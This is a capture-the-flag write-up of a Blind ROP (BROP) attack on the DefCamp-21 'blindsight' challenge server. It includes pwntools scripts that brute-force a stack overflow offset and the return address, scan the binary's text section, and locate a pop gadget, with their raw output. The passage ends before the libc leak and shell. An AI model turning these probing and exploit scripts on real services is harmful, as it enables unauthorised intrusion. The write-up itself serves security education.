---
title: DefCamp-21 Blindsight Writeup
date: 2022-02-14 16:17:00 +0530
categories: [Pwn]
tags: [pwn,BROP]
pin: true
---
![Chall_Desc](/assets/postimg/defcamp-21-blindsight/chall_desc.png)

## Challenge Overview
---
This is a writeup of the `blindsight` challenge from DefCamp-21. The challenge only provides us with a `libc.so` file and the ip and port of a server. We need to find a way to connect to the server and get a shell without the binary running on it

![Chall_files](/assets/postimg/defcamp-21-blindsight/chall_files.png)

## Recon
---
We can connect to the server using the netcat command
```bash
nc <ip> <port>
```
We see that when we provide input of small size we get a response message but when the message exceeds a certain length we dont get that message, this could mean that we overwrote the RIP

## Get RIP Offset
---
At first I thought there could be a stack canary but to brute force that canary the server would have to fork or make threads so that the canary remains same between connections. So since there is no canary I started bruteforcing the offset at which the RIP is stored from our input using the function below.

```py
import pwn
# Global Variables
libc = pwn.ELF("libc-2.23.so")
HOST = "34.159.129.6"
PORT = 30550

def GetRipOffset():
    offset = 1
    while True:
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*offset
        io.recvuntil(b"?\n")
        io.send(payload)
        mssg = io.recvall()
        if b'No password' not in mssg:
            break
        offset += 1
    return offset-1
```
We get the offset as 88 so we make that as a global variable to help us in the future.
```py
OFFSET = 88
```

## Bruteforcing the RIP
---
Since we got the offset we can bruteforce the RIP by bruteforcing the offset from the input. The way we bruteforce it is we bruteforce the bytes at which the return message is printed

```py
def BruteRip():
    rip = b''
    for i in range(0, 8):
        for j in range(0, 256):
            io = pwn.remote(HOST, PORT, level='critical')
            payload = b'A'*OFFSET + rip + pwn.p8(j)
            io.send(payload)
            mssg = io.recv()
            if b'No password' in mssg:
                rip += pwn.p8(j)
                pwn.log.success("RIP: " + hex(pwn.unpack(rip, 'all')))
                io.close()
                break
            io.close()
    return rip
```
With this script we get -
```py
RIP = 0x40070a
```
Keep in mind that this may not be the exact address of the function that prints the message `No password for you` but it is close to it.  
From the `RIP` we can also infer that it is `x64` executable with `PIE` enabled as its `text` section is mapped at address starting from `0x400000`. We add 2 more global variables -
```py
BINARY_BASE = 0x400000
RIP = 0x40070a
```

## Scan Text section
---
Since we know the start of the `.text` section we can scan the text section for the functions present in it and the output they give. I used the following function - 

```py
def ScanText():
    for i in range(0, 0x1000):
        pwn.log.info("Scanning: " + hex(BINARY_BASE + i))
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET + pwn.p64(BINARY_BASE + i)
        io.send(payload)
        mssg = io.recv(0x1000)
        if mssg != b'Are you blind my friend?\n' and mssg != b'Are you blind my friend?':
            print("Offset", i, "Addr", BINARY_BASE+i, mssg)
        io.close()
```
The output that we get is - 

```bash
Offset 1365 Addr 4195669 b'Are you blind my friend?\n\x9ac&\x06P\x7f\x00\x00AAAAAAAAF\x00\x00\x00\x00\x00\x00\x00 &[\x06P\x7f\x00\x00\xf0W6\xd2\xff\x7f\x00\x000Y6\xd2\xff\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\xc7%\x06P\x7f\n'
Offset 1367 Addr 4195671 b"Are you blind my friend?\n\x9a\xc3\xc5\xb3\xad\x7f\x00\x00AAAAAAAAF\x00\x00\x00\x00\x00\x00\x00 \x86\xfa\xb3\xad\x7f\x00\x00\xd0\xeb\xac\xbf\xfc\x7f\x00\x00\x10\xed\xac\xbf\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H'\xc5\xb3\xad\x7f\n"
Offset 1372 Addr 4195676 b'Are you blind my friend?\n\x9asu\x00\xb5\x7f\x00\x00AAAAAAAAC\x00\x00\x00\x00\x00\x00\x00 6\xaa\x00\xb5\x7f\x00\x00P\x9b=i\xfd\x7f\x00\x00\x90\x9c=i\xfd\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\xd7t\n'
Offset 1374 Addr 4195678 b'Are you blind my friend?\n\n'
Offset 1376 Addr 4195680 b'Are you blind my friend?\n\x9a\xe3\xa1\xac8\x7f\x00\x00AAAAAAAAF\x00\x00\x00\x00\x00\x00\x00 \xa6\xd6\xac8\x7f\x00\x00@\xdd\xc7f\xfe\x7f\x00\x00\x80\xde\xc7f\xfe\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00HG\xa1\xac8\x7f\n'
Offset 1377 Addr 4195681 b'Are you blind my friend?\n\n'
Offset 1382 Addr 4195686 b'Are you blind my friend?\n\n'
Offset 1472 Addr 4195776 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1474 Addr 4195778 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1475 Addr 4195779 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1477 Addr 4195781 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1478 Addr 4195782 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1479 Addr 4195783 b'Are you blind my friend?\nAre you blind my friend?'
Offset 1481 Addr 4195785 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1485 Addr 4195789 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1486 Addr 4195790 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1487 Addr 4195791 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1488 Addr 4195792 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1494 Addr 4195798 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1495 Addr 4195799 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1501 Addr 4195805 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1502 Addr 4195806 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1718 Addr 4196022 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1719 Addr 4196023 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1720 Addr 4196024 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1722 Addr 4196026 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1762 Addr 4196066 b'Are you blind my friend?\nAre you blind my friend?\n'
Offset 1782 Addr 4196086 b'Are you blind my friend?\nAre you blind my friend?'
Offset 1787 Addr 4196091 b'Are you blind my friend?\nAAAAAAAA>\x00\x00\x00\x00\x00\x00\x00 V\xd2xK\x7f\x00\x00 \xa2@&\xfe\x7f\x00\x00`\xa3@&\xfe\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\xf7\x9cxK\x7f\n'
Offset 1802 Addr 4196106 b'Are you blind my friend?\nNo password for you!\n'
Offset 1804 Addr 4196108 b'Are you blind my friend?\nNo password for you!\n'
Offset 1806 Addr 4196110 b'Are you blind my friend?\nDo not dump my memory!\n'
Offset 1811 Addr 4196115 b'Are you blind my friend?\nAAAAAAAA>\x00\x00\x00\x00\x00\x00\x00 \x96\xfc\xb8\xac\x7f\x00\x00`\xa7 z\xfe\x7f\x00\x00\xa0\xa8 z\xfe\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H7\xc7\xb8\xac\x7f\n'
Offset 1818 Addr 4196122 b'Are you blind my friend?\nNo password for you!\n'
Offset 1823 Addr 4196127 b'Are you blind my friend?\nAAAAAAAA>\x00\x00\x00\x00\x00\x00\x00 6G\xea\xc2\x7f\x00\x00\x00[\xf0\xfc\xfc\x7f\x00\x00@\\\xf0\xfc\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\xd7\x11\xea\xc2\x7f\n'
```

We got a lot of info from these fucntions. Let me go over them a little bit.

* So we see that at some offset, the function that takes our input gets callbacked again. So i manually went over the offsets and found which functions allows us to loopback to the start without crashing. I set the address to a variable `LOOPBACK_FUNC = BINARY_BASE + 0x5c0`

* We see that there is also a function which leaks `libc` address and also takes our input. This would've been much easier to use to exploit but I thought that this kinda seems unintentional.

* There is also a troll function which when called prints out `Do not dump my memeory!`

At the end we update our global variables with - 
```py
DUMP_FUNC = BINARY_BASE + 1806
LOOPBACK_FUNC = BINARY_BASE + 0x5c0
```

## BROP
---
We've done our reconnaissance, now we have to plan how to exploit this. We can use `Blind Return Oriented Programming` which is a technique we use when we have to `ROP` without the target binary.  

These are the things we need to perform a `BROP` attack:

* A `stop gadget` or something that when called will either stop the execution or print something know to us. I decided to use the troll `DUMP_FUNC`

* Next step is to find the special `BROP` gadget that allows us to control `RDI` and can be spotted easily. I'll go over this later.

* Next we need to leak libc for that we'll use the `plt` and `got` to our advantage.  

## The Special BROP Gadget
---
This [article](https://kn0wledge.fr/write-ups/pwn-blind-date/#finding-a-brop-gadget) does a much better job at explaining about how this gadget works and how to find it. Basically, at some address it pops `6` values into registers and then returns and at another offset it only pops `2` values and returns and there is finally another offset it only pops into `RDI` and returns.  

Heres the function that I used - 
```py
def FindBropGadget():
    possible = []
    for i in range(BINARY_BASE, BINARY_BASE+0x1000):
        pwn.log.info("Scanning: " + hex(i))
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(i)  # Possible pop gadget
        payload += pwn.p64(0)  # pop rbx
        payload += pwn.p64(0)  # pop rbp
        payload += pwn.p64(0)  # pop r12
        payload += pwn.p64(0)  # pop r13
        payload += pwn.p64(0)  # pop r14
        payload += pwn.p64(0)  # pop r15
        payload += pwn.p64(DUMP_FUNC)
        io.send(payload)
        mssg = io.recv(0x1000, timeout=0.2)
        if b'Do not dump' in mssg:
            pwn.log.success("Found pop gadget at: " + hex(i))
            possible.append(i)
        io.close()
    return possible
```

This gave me a possible list of addresses that could contain this gadget

```bash
[+] Found pop gadget at: 0x4007ba
[+] Found pop gadget at: 0x40070e
```

To confirm the gadget, I added the offset to the address so that it pops less values than before and check which is correct.

```py
def CheckBROP():
    # possible = [4196110, 4196282]
    # for i in possible:
    #     io = pwn.remote(HOST, PORT, level='critical')
    #     payload = b'A'*OFFSET
    #     payload += pwn.p64(i + 7)  # possilbe pop 2 gadget
    #     payload += pwn.p64(0)  # pop rsi
    #     payload += pwn.p64(0)  # pop r15
    #     payload += pwn.p64(DUMP_FUNC)
    #     io.send(payload)
    #     mssg = io.recv(0x1000, timeout=0.2)
    #     if b'Do not dump' in mssg:
    #         pwn.log.success("Found pop gadget at: " + hex(i))
    #     io.close()
    possible = [4196110, 4196282]
    for i in possible:
        io = pwn.remote(HOST, PORT, level='critical')
        payload = b'A'*OFFSET
        payload += pwn.p64(i + 9)  # possilbe pop 2 gadget
        payload += pwn.p64(0)  # pop rdi
        payload += pwn.p64(DUMP_FUNC)
        io.send(payload)
        mssg = io.recv(0x1000, timeout=0.2)
        if b'Do not dump' in mssg:
            pwn.log.success("Found pop gadget at: " + hex(i))
        io.close()
```

From this I got the correct address of the BROP gadget and I added it to the global variables.

```py
BROP_GADGET = 0x4007ba
```